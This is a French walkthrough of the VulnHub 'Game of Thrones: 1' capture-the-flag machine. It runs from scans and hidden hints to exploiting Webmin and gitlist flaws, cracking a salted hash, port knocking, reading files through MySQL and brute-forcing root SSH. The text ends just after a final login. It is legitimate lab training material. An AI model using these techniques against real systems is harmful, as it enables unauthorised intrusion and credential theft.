# Solution du CTF Game of Thrones: 1 de VulnHub

Introduction
------------

Comme le laisse supposer le nom du CTF on a ici affaire à un challenge très fortement inspiré de la série TV, elle même inspirée des romans de l'auteur *George R. R. Martin*.  

[La description du challenge](https://www.vulnhub.com/entry/game-of-thrones-ctf-1,201/) permet de savoir à quoi nous attendre :  

* des indices à lire attentivement donc potentiellement cryptiques
* des flags à récupérer d'une longueur de 32 caractères chacun
* aucune connaissance de la série TV n'est nécessaire
* des mécanismes anti-force brute présents (fail2ban)
* un niveau général de difficulté entre moyen et difficile

Bref de quoi mettre l'eau à la bouche :)  

Un scan approfondi de port... réal
----------------------------------

Bien-sûr la première chose à faire sur un CTF de ce type est de voir quelles sont les différentes portes.  

```plain
Nmap scan report for 192.168.1.30
Host is up (0.00076s latency).
Not shown: 65526 closed ports
PORT      STATE    SERVICE     VERSION
21/tcp    open     ftp?
22/tcp    open     ssh         Linksys WRT45G modified dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|   2048 e6:5b:d7:78:6b:86:4f:9b:35:40:9f:c7:1f:dd:0d:9f (RSA)
|_  256 b8:e3:30:88:2e:ba:56:f2:49:b0:cc:35:c7:cc:48:06 (ECDSA)
53/tcp    open     domain      ISC BIND Bind
| dns-nsid: 
|_  bind.version: Bind
80/tcp    open     http        Apache httpd
| http-robots.txt: 2 disallowed entries 
|_/secret-island/ /direct-access-to-kings-landing/
|_http-server-header: Apache
|_http-title: Game of Thrones CTF
143/tcp   filtered imap
1337/tcp  open     http        nginx
| http-auth:
| HTTP/1.1 401 Unauthorized
|_  Basic realm=Welcome to Casterly Rock
|_http-server-header: nginx
|_http-title: 401 Authorization Required
3306/tcp  filtered mysql
5432/tcp  open     postgresql?
10000/tcp open     http        MiniServ 1.590 (Webmin httpd)
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: MiniServ/1.590
|_http-title: Login to Stormlands
```

La page d'index du site (port 80) affiche juste les blasons des différentes familles et les mots *Game of Thrones* le tout sur un fond musical.  

Le code HTML de la page contient quelques indices en commentaires :  

> The game already started!! A couple of hints as a present.

> "Everything can be TAGGED in this world, even the magic or the music" - Bronn of the Blackwater

> "To enter in Dorne you'll need to be a kind face" - Ellaria Sand

On tilte immédiatement sur l'indice sur les tags. D'autant plus que dans le même code HTML on peut voir deux balises media, l'une pour un wav et l'autre pour un mp3.  

Un petit *exiftool* sur le fichier mp3 nous offre notre premier flag :  

```plain
ExifTool Version Number         : 10.10
File Name                       : game_of_thrones.mp3
Directory                       : .
File Size                       : 1646 kB
File Modification Date/Time     : 2017:08:22 01:39:19+02:00
File Access Date/Time           : 2017:10:25 15:52:57+01:00
File Inode Change Date/Time     : 2017:10:25 15:52:57+01:00
File Permissions                : rw-rw-r--
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 128 kbps
Sample Rate                     : 44100
Channel Mode                    : Joint Stereo
MS Stereo                       : On
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : True
Emphasis                        : None
Encoder                         : LAME3.97
Lame VBR Quality                : 4
Lame Quality                    : 5
Lame Method                     : CBR
Lame Low Pass Filter            : 17 kHz
Lame Bitrate                    : 128 kbps
Lame Stereo Mode                : Joint Stereo
Cover Art Front Desc            : Cover Art (Front).jpg
Cover Art Front                 : (Binary data 38227 bytes, use -b option to extract)
ID3 Size                        : 40571
Album                           : O.S.T.
Comment                         : Savages secret flag: 8bf8854bebe108183caeb845c7676ae4
Title                           : Game of Thrones - Main theme
Picture MIME Type               : image/jpeg
Picture Type                    : Front Cover
Picture Description             : Cover Art (Front).jpg
Picture                         : (Binary data 38227 bytes, use -b option to extract)
Artist                          :
Year                            :
Genre                           : None
Duration                        : 0:01:42 (approx)
```

Jetons maintenant un œil aux entrées du *robots.txt*.  

Si on se rend sur la première entrée on tombe sur une image de *Jon Snow* mourrant à *Castle Black*. Rien d'intéressant pour nous ici, sauf si bien sûr on spécifie le bon user-agent :  

```plain
curl -A Three-eyed-raven http://192.168.1.30/the-tree/
```

Cette fois-ci la page html contient différents indices utiles fournis par *Bran Stark* :  

> "I will give you three hints, I can see the future so listen carefully" - The three-eyed raven Bran Stark  
> 
>   
> 
> "To enter in Dorne you must identify as oberynmartell. You still should find the password"  
> 
> "3487 64535 12345 . Remember these numbers, you'll need to use them with POLITE people you'll know when to use them"  
> 
> "The savages never crossed the wall. So you must look for them before crossing it"

Le premier indice ne semble pas nous concerner pour le moment.  

Le second semble clairement suggérer un scan de port à faire avec *Nmap* (*POLITE* est l'une des valeurs possibles pour l'option -T permettant de spécifier la vitesse du scan). Les chiffres sont donc des ports. Cependant il semble que l'on ait pas à le faire immédiatement.  

Le dernier indices concernent les sauvageons or on a déjà récupéré le flag correspondant.  

Inutile de baisser les bras, après tout il nous reste deux entrées dans le *robots.txt*.  

L'URL */direct-access-to-kings-landing/* est bien sûr uniquement là pour nous narguer, toutefois un indice (inutile pour nous) est présent en commentaire :  

> "I've heard the savages usually play music. They are not as wild as one can expect, are they?" - Sansa Stark

L'autre entrée a une véritable utilité puisqu'il s'agit d'une carte qui donne les différentes étapes du jeu à passer et l'ordre à suivre.  

![Map to Westeros](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/map_to_westeros.jpg)

Voici une retranscription textuelle des différentes étapes :  

```plain
The seven kingdoms (flags):
  1 - Dorne (ftp)
  2 - The Wall & The North (http)
  3 - Iron Islands (dns)
  4 - Stormlands (webmin)
  5 - Mountain and the Vale (postgresql)
  6 - The Reach (imap)
  7 - The Rock and King’s Landing (gitlist and mysql)

Extra content:
  Final Battle (ssh):   Against White Walkers

3 secret flags:
  Savages
  City of Braavos
  Dragonglass Mine
```

Allez on Dorne tout ce qu'on a !
--------------------------------

Ok donc on a eu l'un des flags secrets (*Savages*) mais bon c'était un peu la salade d'accueil de *Buffalo*... Il faut maintenant passer au plat de résistance avec le premier royaume, celui de *Dorne*.  

Et ça semble plutôt ([ou Dingo ?](https://www.youtube.com/watch?v=WN1uHFfjc6I)) bien parti puisque l'on a déjà le nom d'utilisateur du FTP (*oberynmartell*)  

Je continue de fouiller et via le brute force des urls je trouve */raven.php* avec l'indice suivant :  

> You received a raven with this message:  
> 
> "To pass through the wall, mcrypt spell will help you. It doesn't matter who you are, only the key is needed to open the secret door" - Anonymous

Hmmmm...k Pas vraiment ce que j'espérais.  

Je trouve d'autres indices dans le fichier */js/game\_of\_thrones.js*  

> "You'll never enter into King's Landing through the main gates. The queen ordered to close them permanently until the end of the war" - Tywin Lannister  
> 
>   
> 
> "If you put a city under siege, after five attacks you'll be banned two minutes" - Aegon the Conqueror and His Conquest of Westeros Book

Aïe aïe aïe, de quoi se sentir comme un *Greyjoy* qui viendrait de rencontrer un *Bolton*... Mais haut le(s) cœur(s) ! On doit faire *Hodor* à ce CTF !  

Dans ma quête j'ai demandé conseil à l'auteur du CTF qui m'a dit d'insister sur le brute force des URLs que j'avais déjà fait. J'avais bien vu un dossier */h/* qui retournait un code 403 et j'avais cherché à l'intérieur les URLs ne répondant pas par 403.  

Mais en fouillant plus on découvre un sous dossier 'i' qui répond par 403 alors que les autres répondent en fait par 404. Du coup j'essaye /h/i/t... aucun résultat. Puis /h/i/d qui retourne un 403.  

Par trop difficile ensuite de trouver l'URL /h/i/d/d/e/n/ qui contient les indices suivants :  

> "My little birds are everywhere. To enter in Dorne you must say: A\_verySmallManCanCastAVeryLargeShad0w . Now, you owe me" - Lord (The Spider) Varys  
> 
>   
> 
> "Powerful docker spells were cast over all kingdoms. We must be careful! You can't travel directly from one to another... usually. That's what the Lord of Light has shown me" - The Red Woman Melisandre

Yes ! On a maintenant de quoi entrer sur Dorne + un indice pour plus tard :-)  

Winterfell c'est Sansa(s) !
---------------------------

Le compte FTP permet de récupérer un flag ainsi que deux fichiers :  

```plain
Connected to 192.168.1.30.
220-------------------------
220-"These are the Dorne city walls. We must enter!" - Grey Worm
220-
220-"A fail2ban spell is protecting these walls. You'll never get in" - One of the Sand Snake Girls
220-------------------------
220 This is a private system - No anonymous login
Name (192.168.1.30:devloop): oberynmartell
331 User oberynmartell OK. Password required
Password:
230-OK. Current directory is /
230-Welcome to:
230- ____
230-|    \ ___ ___ ___ ___
230-|  |  | . |  _|   | -_|
230-|____/|___|_| |_|_|___|
230-
230-Principality of Dorne was conquered. This is your first kingdom flag!
230 fb8d98be1265dd88bac522e1b2182140
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Connecting to port 51065
-rw-r--r--    1 0          0                 304 Aug 27 22:15 problems_in_the_north.txt
-rw-r--r--    1 0          0                 492 Aug 20 00:31 the_wall.txt.nc
226-Options: -l
226 2 matches total
```

Le fichier texte contient les indices suivant :  

> "There are problems in the north. We must travel quickly. Once there we must defend the wall" - Jon Snow  
> 
>   
> 
> "What kind of magic is this?!? I never saw before this kind of papirus. Let's check it carefully" - Maester Aemon Targaryen  
> 
>   
> 
> md5(md5($s).$p)  
> 
>   
> 
> nobody:6000e084bf18c302eae4559d48cb520c$2hY68a

Ok hashcat devrait pouvoir casser de genre de hash, puisque le md5 du salt est juste un prefix mais fsck hashcat j'ai pas de GPU et la version legacy semble trop prise de tête à compiler.  

Un petit peu de Python fera l'affaire :  

```python
from hashlib import md5
import sys

good_hash = "6000e084bf18c302eae4559d48cb520c"
salt = b"2hY68a"
prefix = md5(salt).hexdigest().encode()

with open(sys.argv[1]) as fd:
    for candidate in fd:
        candidate = candidate.strip()
        if md5(prefix + candidate.encode(errors="ignore")).hexdigest() == good_hash:
            print("Password is {}".format(candidate))
            break
```

Avec l'aide d'une wordlist (ex: *rockyou*) on retrouve facilement le mot de passe (*stark*).  

On peut alors déchiffrer le second fichier chiffré avec mcrypt :  

```bash
$ file the_wall.txt.nc
the_wall.txt.nc: mcrypt 2.5 encrypted data, algorithm: rijndael-128, keysize: 32 bytes, mode: cbc,
$ sudo apt-get install mcrypt
$ mcrypt -d the_wall.txt.nc
```

Le fichier obtenu a les infos suivantes :  

> "We defended the wall. Thanks for your help. Now you can go to recover Winterfell" - Jeor Mormont, Lord Commander of the Night's Watch  
> 
>   
> 
> "I'll write on your map this route to get faster to Winterfell. Someday I'll be a great maester" - Samwell Tarly  
> 
>   
> 
> http://winterfell.7kingdoms.ctf/------W1nt3rf3ll------  
> 
> Enter using this user/pass combination:  
> 
> User: jonsnow  
> 
> Pass: Ha1lt0th3k1ng1nth3n0rth!!!

Un Rhaegar perçant sur DNS
--------------------------

Une fois connecté sur la nouvelle adresse on trouve des indices dans le code HTML :  

> Welcome to Winterfell  
> 
> You conquered the Kingdom of the North. This is your second kingdom flag!  
> 
> 639bae9ac6b3e1a84cebb7b403297b79  
> 
>   
> 
> "We must do something here before travelling to Iron Islands, my lady" - Podrick Payne  
> 
>   
> 
> "Yeah, I can feel the magic on that shield. Swords are no more use here" - Brienne Tarth

On trouve aussi un indice dans un CSS (*http://winterfell.7kingdoms.ctf/winterfell.css*) :  

> "Old TeXTs are written about how to enter into the Iron Islands fortress" - Theon Greyjoy

Un AXFR sur la zone (*dig -t AXFR 7kingdoms.ctf @192.168.1.30*) nous indique que l'accès est refusé :(   

Un dig ANY nous retourne plus d'informations en revanche :  

```plain
; <<>> DiG 9.10.3-P4-Ubuntu <<>> -t ANY 7kingdoms.ctf @192.168.1.30
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 65363
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;7kingdoms.ctf.                 IN      ANY

;; ANSWER SECTION:
7kingdoms.ctf.          86400   IN      TXT     "This is the Pyke Iron Islands fortress. We are ironborn. We're not subjects, we're not slaves. We do not plow the field or toil in the mine. We take what is ours. What is dead may never die"
7kingdoms.ctf.          86400   IN      TXT     "If you try to enter using brute force, you'll be defeated. You only must ask the right question. - Yara Greyjoy"
7kingdoms.ctf.          86400   IN      A       192.168.0.161
7kingdoms.ctf.          86400   IN      SOA     ns1.7kingdoms.ctf. ns2.7kingdoms.ctf. 2017072301 21600 3600 604800 86400
7kingdoms.ctf.          86400   IN      NS      ns1.7kingdoms.ctf.
7kingdoms.ctf.          86400   IN      NS      ns2.7kingdoms.ctf.
7kingdoms.ctf.          86400   IN      MX      10 mail.7kingdoms.ctf.

;; ADDITIONAL SECTION:
ns1.7kingdoms.ctf.      86400   IN      A       192.168.0.161
ns2.7kingdoms.ctf.      86400   IN      A       192.168.0.161
mail.7kingdoms.ctf.     86400   IN      A       192.168.0.161
```

J'ai pas mal galéré sur cette partie du challenge qui m'a donné quelques *Varys* :-p   

Comme les enregistrements montrent une IP différente pour le SOA j'ai tenté de reconfigurer la VM pour être sur le réseau 192.168.0.0/24 mais le SOA changeait pour la nouvelle adresse de la VM :-/   

Il fallait relire la discussion entre *Podrick* et *Brienne* : sur la page HTML se trouve le blason des *Stark* or ce fichier se nomme *stark\_shield.jpg*.  

![stark_shield.jpg](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/stark_shield.jpg)

Un exiftool n'apporte rien mais un strings ou un hexdump montre qu'un indice a été ajouté à la fin du fichier :  

> "Timef0rconqu3rs TeXT should be asked to enter into the Iron Islands fortress" - Theon Greyjoy

```plain
$ dig -t TXT Timef0rconqu3rs.7kingdoms.ctf @192.168.0.3

;; ANSWER SECTION:
Timef0rconqu3rs.7kingdoms.ctf. 86400 IN TXT     "You conquered Iron Islands kingdom flag: 5e93de3efa544e85dcd6311732d28f95.
Now you should go to Stormlands at http://stormlands.7kingdoms.ctf:10000.
 Enter using this user/pass combination: aryastark/N3ddl3_1s_a_g00d_sword#!"
```

Partons Cersei le prochain flag !
---------------------------------

Comme le laissé supposer Nmap et le numéro de port, l'interface *stormlands* est un Webmin.  

Une fois connecté le numéro de version est affiché : *Webmin spell version: 1.590*  

J'ai fouillé un peu pour voir si il y avait une faille quelconque dans le champ de recherche sans résultats. La version est connue pour être vulnérable ([CVE-2012-2982](https://nvd.nist.gov/vuln/detail/CVE-2012-2982)) et un exploit est disponible dans *Metasploit*.  

![Metasploit Webmin options exploit](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/webmin_msf_options.png)

![Arya's flag (successful webmin exploitation)](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/arya_flag_(webmin).png)

C'est l'heure de poser nos little fingers sur Postgres
------------------------------------------------------

```plain
$ psql -h 192.168.0.3 -U robinarryn mountainandthevale
Password for user robinarryn:
psql (9.5.9, server 9.6.4)
WARNING: psql major version 9.5, server major version 9.6.
         Some psql features might not work.
Type "help" for help.

mountainandthevale=> help
You are using psql, the command-line interface to PostgreSQL.
Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit
mountainandthevale=> \dt
                List of relations
 Schema |        Name         | Type  |  Owner
--------+---------------------+-------+----------
 public | aryas_kill_list     | table | postgres
 public | braavos_book        | table | postgres
 public | eyrie               | table | postgres
 public | popular_wisdom_book | table | postgres
(4 rows)

mountainandthevale=> select * from aryas_kill_list;
 id |         name          |                               why
----+-----------------------+-----------------------------------------------------------------
  1 | WalderFrey            | For orchestrating the Red Wedding
  2 | CerseiLannister       | For her role in Ned Starks death
  3 | TheMountain           | For the torture at Harrenhal
  4 | TheHound              | For killing Mycah, the butchers boy
  5 | TheRedWomanMelisandre | For kidnapping Gendry
  6 | BericDondarrion       | For selling Gendry to Melisandre
  7 | ThorosofMyr           | For selling Gendry to Melisandre
  8 | IlynPayne             | For executing Ned Stark
  9 | MerynTrant            | For killing Syrio Forel
 10 | JoffreyBaratheon      | For ordering Ned Starks execution
 11 | TywinLannister        | For orchestrating the Red Wedding
 12 | Polliver              | For killing Lommy, stealing Needle and the torture at Harrenhal
 13 | Rorge                 | For the torture at Harrenhal and threatening to rape her
(13 rows)

mountainandthevale=> select * from braavos_book;
 page |                                                                                                                  text                                                                 
------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    1 | City of Braavos is a very particular place. It is not so far from here.
    2 | "There is only one god, and his name is Death. And there is only one thing we say to Death: Not today" - Syrio Forel
    3 | Braavos have a lot of curious buildings. The Iron Bank of Braavos, The House of Black and White, The Titan of Braavos, etc.
    4 | "A man teaches a girl. -Valar Dohaeris- All men must serve. Faceless Men most of all" - Jaqen H'ghar
    6 | "A girl has no name" - Arya Stark
    7 | City of Braavos is ruled by the Sealord, an elected position.
    8 | "That man's life was not yours to take. A girl stole from the Many-Faced God. Now a debt is owed" - Jaqen H'ghar
    9 | Dro wkxi-pkmon qyn gkxdc iye dy mrkxqo iyeb pkmo. Ro gkxdc iye dy snoxdspi kc yxo yp iyeb usvv vscd. Covomd sd lkcon yx drsc lyyu'c vycd zkqo xewlob. Dro nkdklkco dy myxxomd gsvv lo lbkkfyc kxn iyeb zkccgybn gsvv lo: FkvkbWybqrevsc
(8 rows)

mountainandthevale=> select * from eyrie;
 id |          character           |                                                                         text
----+------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------
  1 | Lysa Arryn                   | We were allies for centuries. We can negotiate the peace if you win this mind game
  2 | Robin Arryn                  | The flag is hidden somewhere on this dungeon. You'll never find it. Ha ha ha!
  3 | Mord                         | You'll be thrown into one of the sky cells!!
  4 | Petyr (Littlefinger) Baelish | I'm here to help as always... If you OWN your destiny you can do anything
  5 | Tyrion Lannister             | Books say stupid things sometimes like people do. You have to decide what to believe and what could be useful. The best choice for me is to be drunk
(5 rows)

mountainandthevale=> select * from popular_wisdom_book;

 id |                                                                                                text                                                                                     
----+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  1 | The First Men are the original human inhabitants of Westeros
  2 | The King's Landing main gates are closed by orders of the Queen. Nobody can pass, and it seems something permanent
  3 | The High Garden citizens never were great warriors, they are POLITE people. If you want to enter to their fortress you only need to Knock at the gates but following their rules... they like order
  4 | A Lannister always pays his debts
  5 | The old arcane Docker magic is present over all the kingdoms. Usually you can't use it to move between them but there is a secret tunnel from The Rock to King's Landing, everybody knows that
  6 | The Iron Bank has the control. They can give you anything you want if you pay enough...
(6 rows)
```

Une pluie d'indices ici ! :-)   

L'entrée 9 du *braavos\_book* attire mon attention. Un rot13 ne permet pas d'obtenir un texte lisible mais d'après le placement de la lettre 'o' on est clairement sur un chiffrement par substitution et même probablement par décalage.  

La flemme de coder un script pour décoder ça du coup j'ai trouvé [une page](https://www.nayuki.io/page/automatic-caesar-cipher-breaker-javascript) permettant de retrouver le bon décalage et donc le texte en clair que voici :  

> The many-faced god wants you to change your face.
> He wants you to identify as one of your kill list.
> Select it based on this book's lost page number.
> The database to connect will be braavos and your password will be: ValarMorghulis

On s'exécute :  

```plain
$ psql -h 192.168.0.3 -U TheRedWomanMelisandre braavos
Password for user TheRedWomanMelisandre:
psql (9.5.9, server 9.6.4)
WARNING: psql major version 9.5, server major version 9.6.
         Some psql features might not work.
Type "help" for help.

braavos=> \dt
                   List of relations
 Schema |            Name            | Type  |  Owner
--------+----------------------------+-------+----------
 public | temple_of_the_faceless_men | table | postgres
(1 row)

braavos=> select * from temple_of_the_faceless_men;
               flag               |                                                    text
----------------------------------+-------------------------------------------------------------------------------------------------------------
 3f82c41a70a8b0cfec9052252d9fd721 | Congratulations. You've found the secret flag at City of Braavos. You've served well to the Many-Faced God.
(1 row)
```

IMAP... Bravos risques et périls !
----------------------------------

D'après la carte la prochaine étape est le port 143 (IMAP). On est sûr d'après les indices qu'il y a un port-knocking à faire mais la commande suivante échoue à nous ouvrir le port :  

```bash
nmap -sT -T polite -p3487,64535,12345 -r 192.168.0.3
```

Le shell que l'on a récupéré avec l'exploit webmin a les droits root... mais on est dans un conteneur *Docker*. De nombreux outils standards ne sont pas présents (ps, netstat, ifconfig, etc) et il faut les uploader sur le système (avec les librairies associées) pour avoir un environnement utilisable pour nos investigations.  

Au lieu d'uploader Nmap et ses nombreuses dépendances j'ai scanné les ports depuis le conteneur avec un one-liner Python :  

```python
[time.sleep(.005) or socket.socket().connect_ex(("192.168.0.3", port)) for port in (3487,64535,12345,143)]
[111, 111, 111, 0]
```

La dernière valeur (0) nous indique que la connexion au port 143 s'est bien ouverte après avoir tapé sur les autres ports :-)   

Dialoguer avec le serveur IMAP depuis un shell aussi basique n'est pas agréable, heureusement je peux forwarder le port jusqu'à mon système via ssh (à uploader préalablement sur le système) :  

```bash
ssh -R 9999:172.21.0.1:143 -fN devloop@192.168.0.16
```

Pour autant le serveur IMAP n'a pas de bannière donnant le moindre indice :( Clairement j'ai loupé une information quelque part.  

![And now what?](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/meme9.jpg)

N'étant pas un expert en PostgreSQL je suis retourné sur le service et j'ai essayé d'autres commandes :  

```plain
mountainandthevale=> \d
                      List of relations
 Schema |            Name            |   Type   |   Owner
--------+----------------------------+----------+------------
 public | aryas_kill_list            | table    | postgres
 public | aryas_kill_list_id_seq     | sequence | postgres
 public | braavos_book               | table    | postgres
 public | eyrie                      | table    | postgres
 public | eyrie_id_seq               | sequence | postgres
 public | flag                       | view     | robinarryn
 public | popular_wisdom_book        | table    | postgres
 public | popular_wisdom_book_id_seq | sequence | postgres
(8 rows)

mountainandthevale=> select * from flag;
ERROR:  permission denied for relation flag
```

Ohoh ! Il y avait une *view*... à voir. Yara (Greyjoy) peut être une documentation à potasser :D  

Un petit *grant select on flag to robinarryn* plus tard on obtient dans la table flag un gros base64 à décoder :  

> Nice! you conquered the Kingdom of the Mountain and the Vale.  
> 
> This is your flag: bb3aec0fdcdbc2974890f805c585d432.  
> 
> Next stop the Kingdom of the Reach.  
> 
> You can identify yourself with this user/pass combination: olennatyrell@7kingdoms.ctf/H1gh.Gard3n.powah,  
> 
>  but first you must be able to open the gates

En ce qui me concerne les ports sont déjà ouvertes :) Il ne reste plus qu'à configurer *Thunderbird* (ça pourrait être une maison de GoT) avec les informations récupérées.  

![IMAP flag](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/thereach_imap_flag.png)

A-Tyrion notre attention sur ce repo !
--------------------------------------

Une fois forwardé, le port 1337 s'avère être un *gitlist* qui affiche trois repos :  

![gitlist GoT repos](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/gitlist.png)

Sur le premier se trouve un commit de *tyrionlannister@7kingdoms.ctf* avec le texte suivant (contenu du fichier poussé) :  

> Note under the bed
> There is a note under the bed. Somebody put it there. It says:
> 
> 2f686f6d652f747972696f6e6c616e6e69737465722f636865636b706f696e742e747874
> 
> "The main gates of King's Landing are permanently closed by Queen's order. You must search for another entrance"
> 
> An anonymous friend

La note est évidemment de l'hexadécimal qu'on décode rapidement avec Python :  

```python
>>> from binascii import unhexlify
>>> unhexlify("2f686f6d652f747972696f6e6c616e6e69737465722f636865636b706f696e742e747874")
b'/home/tyrionlannister/checkpoint.txt'
```

Il existe [une bien jolie vulnérabilité pour gitlist](http://hatriot.github.io/blog/2014/06/29/gitlist-rce/) que je m'empresse d'exploiter :  

![Gitlist RCE](https://raw.githubusercontent.com/devl00p/blog/master/images/GoT/git_rce_test.png)

Et si on passe la commande *cat /home/tyrionlannister/checkpoint.txt* on obtient le HTML suivant :  

```html
fatal: Not a valid object name master:Welcome to:

 _____ _          _____         _   

|_   _| |_ ___   | __  |___ ___| |_ 

  | | |   | -_|  |    -| . |  _| '_|

  |_| |_|_|___|  |__|__|___|___|_,_|

You are very close to get the flag. Is not here, it's at King's Landing. We must travel there from here!

The credentials to access to King's Landing are:

user/pass: cerseilannister/_g0dsHaveNoMercy_
db: kingslanding

"Chaos isn't a pit. Chaos is a ladder" - Petyr (Littlefinger) Baelish
```

La (re)quête pour MySQL
-----------------------

```plain
$ mysql -h 127.0.0.1 -P 3336 -u cerseilannister -p kingslanding

mysql> show tables;
+------------------------+
| Tables_in_kingslanding |
+------------------------+
| iron_throne            |
+------------------------+
1 row in set (0,01 sec)
mysql> select * from iron_throne;
+----+------------------------------------------------------------------------------------+
| id | text                                                                               |
+----+------------------------------------------------------------------------------------+
|  1 | -..-. . - -.-. -..-. -- -.-- ... --.- .-.. -..-. ..-. .-.. .- --.                  |
|  2 | "You still have some privileges on this kingdom. Use them wisely" - Davos Seaworth |
+----+------------------------------------------------------------------------------------+
2 rows in set (0,01 sec)
```

Je trouve [un décodeur de Morse en ligne](http://www.onlineconversion.com/morse_code.htm) qui retourne */ETC/MYSQL/FLAG*  

Le reste vient tout seul :  

```plain
mysql> create table dump (data text);
Query OK, 0 rows affected (0,19 sec)

mysql> load data infile '/etc/mysql/flag' into table dump;
Query OK, 7 rows affected (0,03 sec)
Records: 7  Deleted: 0  Skipped: 0  Warnings: 0

mysql> select * from dump;
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| data                                                                                                                                                                                                                                 |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|                                                                                                                                                                                                                                      |
| Congratulations. You conquered the last kingdom flag.                                                                                                                                                                                |
| This is your flag: c8d46d341bea4fd5bff866a65ff8aea9                                                                                                                                                                                  |
| Now you must find the Dragonglass mine to forge stronger weapons.                                                                                                                                                                    |
| Ssh user-pass:                                                                                                                                                                                                                       |
| daenerystargaryen-.Dracarys4thewin.
| "All men must die, but we are not men" - Daenerys Stormborn of the House Targaryen, First of Her Name, the Unburnt, Queen of the Andals and the First Men, Khaleesi of the Great Grass Sea, Breaker of Chains, and Mother of Dragons |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
7 rows in set (0,01 sec)
```

Un petit verre de dragon pour la route ?
----------------------------------------

```plain
$ ssh daenerystargaryen@192.168.0.3
daenerystargaryen@192.168.0.3's password:
 __            _   _            ___
|  |   ___ ___| |_|_|___ ___   |  _|___ ___
|  |__| . | . | '_| |   | . |  |  _| . |  _|
|_____|___|___|_,_|_|_|_|_  |  |_| |___|_|
                        |___|
 ____                          _
|    \ ___ ___ ___ ___ ___ ___| |___ ___ ___
|  |  |  _| .'| . | . |   | . | | .'|_ -|_ -|
|____/|_| |__,|_  |___|_|_|_  |_|__,|___|___|
              |___|       |___|

daenerystargaryen@7kingdoms:~$ id
uid=1000(daenerystargaryen) gid=1000(daenerystargaryen) groups=1000(daenerystargaryen),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
daenerystargaryen@7kingdoms:~$ uname -a
Linux 7kingdoms 4.9.0-3-amd64 #1 SMP Debian 4.9.30-2+deb9u2 (2017-06-26) x86_64 GNU/Linux
```

Le fichier */etc/passwd* indique la présence de deux utilisateurs non-root (dont le notre) :  

```plain
daenerystargaryen:x:1000:1000:daenerystargaryen,,,:/home/daenerystargaryen:/bin/bash
branstark:x:1001:1001::/home/branstark:/bin/bash
```

Le seul fichier que l'on trouve pour *branstark* c'est son home-directory... Ça fait short :| Et on ne dispose pas d'une entrée sudoers quelconque.  

Heureusement il y a des indices dans notre home à nous (*checkpoint.txt*) :  

> "Dragonglass. Frozen fire, in the tongue of old Valyria. Small wonder it is anathema to these cold children of the Other" - The Red Woman Melisandre  
> 
>   
> 
> "Large amounts of Dragonglass can be found on Dragonglass mine (172.25.0.2). The mine can be accessed only from here. We are very close... Fail2ban magic is not present there, maybe we can reach the 'root' of the problem pivoting from outside to use this digger" - Samwell Tarly  
> 
>   
> 
> "The White Walkers don't care if a man's free folk or crow. We're all the same to them, meat for their army. But together we can beat them" - Jon Snow

Ok, le commentaire de *Samwell Tarly* laisse entendre que l'on doit bruteforcer le compte SSH root sur 172.25.0.2. Pour celà on a une passlist dans le fichier *digger.txt* présent sur le système.  

Une fois *Ncrack* et ses librairies copiées sur le système :  

```plain
LD_LIBRARY_PATH=. ./ncrack -u root -P ../digger.txt ssh://172.25.0.2 -T insane

Starting Ncrack 0.6 ( http://ncrack.org ) at 2017-11-04 02:34 CET

Discovered credentials for ssh on 172.25.0.2 22/tcp:
172.25.0.2 22/tcp ssh: 'root' 'Dr4g0nGl4ss!'

Ncrack done: 1 service scanned in 120.02 seconds.

Ncrack finished.
```

Let's go !  

```plain
daenerystargaryen@7kingdoms:~$ ssh root@172.25.0.2
The authenticity of host '172.25.0.2 (172.25.0.2)' can't be established.
ECDSA key fingerprint is SHA256:CLkjibFJaJn7gL10+IfE7LWYVS34ZgavwWKn+ej4LaU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.25.0.2' (ECDSA) to the list of known hosts.
root@172.25.0.2's password:

You found the
 ____                          _
|    \ ___ ___ ___ ___ ___ ___| |___ ___ ___
|  |  |  _| .'| . | . |   | . | | .'|_ -|_ -|
|____/|_| |__,|_  |___|_|_|_  |_|__,|___|___|
              |___|       |___|
       _
 _____|_|___ ___
|     | |   | -_|
|_|_|_|_|_|_|___|

root@1558d33076eb:~# id
uid=0(root) gid=0(root) groups=0(root)
root@1558d33076eb:~# ls
flag.txt
root@1558d33076eb:~# cat flag.txt
Congratulations.
You've found the secret flag of Dragonglass mine. This is your flag: a8db1d82db78ed452ba0882fb9554fc9

Now you have the Dragonglass weapons to fight against the White Walkers.

Host's ssh:
branstark/Th3_Thr33_Ey3d_Raven

"The time has come" - The Three Eyed Raven
```

La Machine aux Multiples IPs
----------------------------

On a maintenant accès au compte branstark membre du groupe docker.  

```plain
$ ssh branstark@192.168.0.3
branstark@192.168.0.3's password:
 _____ _         _    _____     _   _   _
|   __|_|___ ___| |  | __  |___| |_| |_| |___
|   __| |   | .'| |  | __ -| .'|  _|  _| | -_|
|__|  |_|_|_|__,|_|  |_____|__,|_| |_| |_|___|

branstark@7kingdoms:~$ ls
